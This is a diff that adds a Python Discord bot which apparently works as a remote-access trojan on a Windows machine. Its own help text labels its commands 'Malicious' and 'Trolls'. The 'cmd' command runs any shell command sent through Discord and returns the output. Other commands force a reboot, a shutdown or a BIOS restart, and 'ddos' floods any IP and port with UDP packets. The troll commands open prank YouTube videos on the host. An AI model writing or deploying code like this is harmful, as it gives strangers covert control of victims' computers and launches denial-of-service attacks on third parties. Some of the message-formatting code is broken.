@@ -1,0 +1,158 @@
+    import os
+    import discord
+    import time
+    import shutil
+    import subprocess
+    from discord.ext import commands
+    import socket
+    import asyncio
+
+    intents = discord.Intents.default()
+    intents.message_content = True
+
+    bot = commands.Bot(command_prefix='!', intents=intents)
+
+    @bot.event
+    async def on_ready(ctx):
+        await ctx.send("logged in")
+
+    @bot.command()
+    async def hello(ctx):
+        await ctx.send(f"Hello ",ctx.author.mention,"!")
+
+    @bot.command()
+    async def cmd(ctx, *, command: str):
+        try:
+            process = await asyncio.create_subprocess_shell(
+                command,
+                stdout=subprocess.PIPE,
+                stderr=subprocess.PIPE
+            )
+            stdout, stderr = await process.communicate()
+
+            if process.returncode == 0:
+                await ctx.send(f"Command output:\n```,stdout.decode(),```")
+            else:
+                await ctx.send(f"Command error:\n```,stderr.decode(),```")
+        except Exception as e:
+            await ctx.send(f"An error occurred when opening cmd session:",e)
+
+    @bot.command()
+    async def reboot(ctx):
+        try:
+            subprocess.run("shutdown /r /t 0", shell=True, check=True)
+            await ctx.send("Rebooting the system.")
+        except Exception as e:
+            await ctx.send(f"An error occurred during reboot:",e)
+
+    @bot.command()
+    async def shutdown(ctx):
+        try:
+            subprocess.run("shutdown /s /t 0", shell=True, check=True)
+            await ctx.send("Shutting down the system.")
+        except Exception as e:
+            await ctx.send(f"An error occurred during shutdown:",e)
+
+    @bot.command()
+    async def bios(ctx):
+        try:
+            subprocess.run("shutdown /fw ", shell=True, check=True)
+            await ctx.send("Entering BIOS.")
+        except Exception as e:
+            await ctx.send(f"An error occurred while trying to enter BIOS: ",e)
+
+    @bot.command()
+    async def ddos(ctx, target: str, port: int, duration: int):
+        async def ddos_task():
+            try:
+                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+                bytes = os.urandom(1490)
+                nukes_sent = 0
+                end_time = time.time() + duration
+                await ctx.send("DDOSing... bot wont respond until attack is done")
+
+                while time.time() < end_time:
+                    sock.sendto(bytes, (target, port))
+                    nukes_sent += 1
+                await ctx.send(f"Sent ",nukes_sent," packets to ",target,port," over ",duration," seconds.")
+            except Exception as e:
+                await ctx.send(f"An error occurred during DDoS attack:",e)
+            finally:
+                sock.close()
+
+        await asyncio.create_task(ddos_task())
+
+    @bot.command()
+    async def indian(ctx):
+        try:
+            os.popen("start https://www.youtube.com/watch?v=ohf8BsoAU6E")
+        except Exception as e:
+            await ctx.send(f"An error occurred: ",e)
+
+    @bot.command()
+    async def sleepfunk(ctx):
+        try:
+            os.popen("start https://www.youtube.com/watch?v=vlC6nlWXk4M")
+        except Exception as e:
+            await ctx.send(f"An error occurred:",e)
+
+    @bot.command()
+    async def bonzi(ctx):
+        try:
+            os.popen("start https://www.youtube.com/watch?v=abBYedMthaw")
+        except Exception as e:
+            await ctx.send(f"An error occurred:",e)
+
+    @bot.command()
+    async def redeem(ctx):
+        try:
+            os.popen("start https://www.youtube.com/watch?v=UF0F3x8GdmU")
+        except Exception as e:
+            await ctx.send(f"An error occurred:", e)
+
+    @bot.command()
+    async def sadpenguin(ctx):
+        try:
+            os.popen("start https://www.youtube.com/watch?v=8Pc0AEbfnBM")
+        except Exception as e:
+            await ctx.send(f"An error occurred:",e)
+
+    @bot.command()
+    async def heisenburger(ctx):
+        try:
+            os.popen("start https://www.youtube.com/watch?v=b4XpMTUlorc")
+        except Exception as e:
+            await ctx.send(f"An error occurred:",e)
+
+    @bot.command()
+    async def whatsapp(ctx):
+        try:
+            os.popen("start https://www.youtube.com/watch?v=jlw5uDg4izI")
+        except Exception as e:
+            await ctx.send(f"An error occurred:",e)
+
+    @bot.command()
+    async def sure(ctx):
+        try:
+            os.popen("start https://youtu.be/YSWMYnuOImg?si=ESEVXAjRaAI0PFlw")
+        except Exception as e:
+            await ctx.send(f"An error occurred:",e)
+
+    @bot.command()
+    async def skeleton(ctx):
+        try:
+            os.popen("start https://www.youtube.com/watch?v=Uim--YrmGyM")
+        except Exception as e:
+            await ctx.send(f"An error occurred:",e)
+
+    @bot.command()
+    async def list_commands(ctx):
+        await ctx.send("--Trolls--\n1. sure\n2. skeleton\n3. whatsapp\n4. heisenburger\n5. sadpenguin\n6. redeem\n7. bonzi\n8. sleepfunk\n9. indian")
+        await ctx.send("--Malicious--\n1. ddos <ip> <port> <length of attack based on second>\n2. reboot\n3. shutdown\n4.destroy\n5. cmd <command you want to write>")
+
+    @bot.command()
+    async def ping(ctx):
+        latency = round(bot.latency * 1000)
+        await ctx.send(f'🏓 Pong!',latency,'ms')
+
+    bot.run({token})
